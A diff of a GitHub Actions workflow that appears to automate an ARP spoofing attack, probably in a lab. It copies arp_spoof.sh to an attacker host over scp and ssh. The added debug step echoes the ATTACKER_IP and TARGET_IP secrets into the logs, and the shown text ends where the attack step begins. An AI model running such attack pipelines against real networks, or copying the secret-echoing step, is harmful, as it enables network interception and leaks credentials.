@@ -20,6 +20,11 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
+      - name: Debug Environment Variables
+        run: |
+          echo "Attacker IP: ${{ secrets.ATTACKER_IP }}"
+          echo "Target IP: ${{ secrets.TARGET_IP }}"
+          
       - name: Set up SSH key
         run: |
           mkdir -p ~/.ssh
@@ -31,6 +36,7 @@ jobs:
         run: |
           scp arp_spoof.sh rb@$ATTACKER_IP:/home/rb/
           ssh rb@$ATTACKER_IP "chmod +x /home/rb/arp_spoof.sh"
+
 
       - name: Execute ARP spoofing attack
         run: |
